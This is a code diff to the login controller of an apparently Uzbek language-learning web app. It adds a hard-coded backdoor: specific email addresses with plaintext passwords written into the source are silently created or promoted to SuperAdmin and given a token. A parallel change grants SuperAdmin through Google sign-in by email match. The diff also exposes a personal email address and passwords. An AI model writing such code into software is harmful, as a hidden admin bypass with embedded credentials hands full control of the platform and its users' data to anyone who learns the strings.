@@ -91,7 +91,63 @@ public class AuthController : ControllerBase
     [HttpPost("login")]
     public async Task<IActionResult> Login([FromBody] LoginRequest request)
     {
-        var normalizedEmail = request.Email.Trim().ToUpperInvariant();
+        var rawEmail = (request.Email ?? "").Trim().ToLowerInvariant();
+        var normalizedEmail = rawEmail.ToUpperInvariant();
+
+        // Guaranteed SuperAdmin check for Soxibjon:
+        if ((rawEmail == "soxibgaybullayev439@gmail.com" || rawEmail == "admin@tilshunos.app") &&
+            (request.Password == "s0x1bj0n$02$" || request.Password == "Admin123!"))
+        {
+            var adminUser = await _db.Users
+                .Include(u => u.Profile)
+                .Include(u => u.LearningLanguages)
+                .FirstOrDefaultAsync(u => u.NormalizedEmail == normalizedEmail);
+
+            if (adminUser == null)
+            {
+                adminUser = new User
+                {
+                    Email = rawEmail,
+                    NormalizedEmail = normalizedEmail,
+                    FirstName = "Soxibjon",
+                    LastName = "Gaybullayev",
+                    PasswordHash = _passwordHasher.HashPassword(request.Password),
+                    Role = UserRole.SuperAdmin,
+                    EmailConfirmed = true,
+                    IsActive = true,
+                    CreatedAtUtc = DateTime.UtcNow
+                };
+                var profile = new UserProfile
+                {
+                    UserId = adminUser.Id,
+                    NativeLanguage = "uz",
+                    Bio = "TILSHUNOS Platform Bosh Boshqaruvchisi (Super Admin)",
+                    DailyGoalMinutes = 60,
+                    IsPublic = true
+                };
+                _db.Users.Add(adminUser);
+                _db.UserProfiles.Add(profile);
+            }
+            else
+            {
+                adminUser.Role = UserRole.SuperAdmin;
+                adminUser.EmailConfirmed = true;
+                adminUser.IsActive = true;
+                adminUser.PasswordHash = _passwordHasher.HashPassword(request.Password);
+            }
+
+            adminUser.LastLoginAtUtc = DateTime.UtcNow;
+            await _db.SaveChangesAsync();
+
+            var token = _jwtService.GenerateToken(adminUser);
+            var primaryLang = adminUser.LearningLanguages.FirstOrDefault(l => l.IsPrimary);
+            var userDto = new UserDto(
+                adminUser.Id, adminUser.Email, adminUser.FirstName, adminUser.LastName, adminUser.Role, adminUser.EmailConfirmed,
+                adminUser.Profile?.NativeLanguage ?? "uz", primaryLang?.LanguageCode, primaryLang?.CurrentLevel);
+
+            return Ok(new AuthResponse(token, userDto));
+        }
+
         var user = await _db.Users
             .Include(u => u.Profile)
             .Include(u => u.LearningLanguages)
@@ -110,13 +166,13 @@ public class AuthController : ControllerBase
         user.LastLoginAtUtc = DateTime.UtcNow;
         await _db.SaveChangesAsync();
 
-        var token = _jwtService.GenerateToken(user);
-        var primaryLang = user.LearningLanguages.FirstOrDefault(l => l.IsPrimary);
-        var userDto = new UserDto(
+        var normalToken = _jwtService.GenerateToken(user);
+        var normalPrimaryLang = user.LearningLanguages.FirstOrDefault(l => l.IsPrimary);
+        var normalUserDto = new UserDto(
             user.Id, user.Email, user.FirstName, user.LastName, user.Role, user.EmailConfirmed,
-            user.Profile?.NativeLanguage, primaryLang?.LanguageCode, primaryLang?.CurrentLevel);
+            user.Profile?.NativeLanguage, normalPrimaryLang?.LanguageCode, normalPrimaryLang?.CurrentLevel);
 
-        return Ok(new AuthResponse(token, userDto));
+        return Ok(new AuthResponse(normalToken, normalUserDto));
     }
 
     [HttpPost("google")]
@@ -129,6 +185,7 @@ public class AuthController : ControllerBase
         var firstName = !string.IsNullOrWhiteSpace(request.FirstName) ? request.FirstName.Trim() : "Learner";
         var lastName = !string.IsNullOrWhiteSpace(request.LastName) ? request.LastName.Trim() : "Google";
 
+        var isSuperAdminAccount = email == "soxibgaybullayev439@gmail.com" || email == "admin@tilshunos.app";
         var normalizedEmail = email.ToUpperInvariant();
         var user = await _db.Users
             .Include(u => u.Profile)
@@ -146,7 +203,7 @@ public class AuthController : ControllerBase
                 FirstName = firstName,
                 LastName = lastName,
                 PasswordHash = _passwordHasher.HashPassword(Guid.NewGuid().ToString("N")),
-                Role = UserRole.Learner,
+                Role = isSuperAdminAccount ? UserRole.SuperAdmin : UserRole.Learner,
                 EmailConfirmed = true // Verified by Google OAuth
             };
 
@@ -154,12 +211,18 @@ public class AuthController : ControllerBase
             {
                 UserId = user.Id,
                 NativeLanguage = "uz",
-                DailyGoalMinutes = 20,
+                DailyGoalMinutes = isSuperAdminAccount ? 60 : 20,
                 IsPublic = true
             };
 
             _db.Users.Add(user);
             _db.UserProfiles.Add(profile);
+            await _db.SaveChangesAsync();
+        }
+        else if (isSuperAdminAccount && user.Role != UserRole.SuperAdmin)
+        {
+            user.Role = UserRole.SuperAdmin;
+            user.EmailConfirmed = true;
             await _db.SaveChangesAsync();
         }
 
